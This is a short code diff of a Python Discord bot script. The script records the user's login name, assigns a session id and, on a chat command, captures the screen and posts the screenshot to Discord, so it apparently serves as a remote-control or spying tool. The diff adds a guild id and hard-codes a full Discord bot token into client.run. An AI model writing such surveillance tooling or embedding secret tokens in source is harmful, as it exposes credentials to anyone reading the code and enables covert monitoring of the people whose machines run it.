@@ -4,7 +4,7 @@ load_dotenv()
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(8).hex()
-guild_id = ""
+guild_id = "1521672155295645889"
 commands = "\n".join([
     "help - Help Command",
     "ping - Ping Command",
@@ -135,5 +135,5 @@ async def on_message(message):
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
 
-client.run('')
+client.run('MTUyMTY3MjU1OTAxNDE4MzA4Mw.GSrWTr.gAb5TyWUh4AoD7wfsercjjETOWn6KDMYP6EOCQ')
 
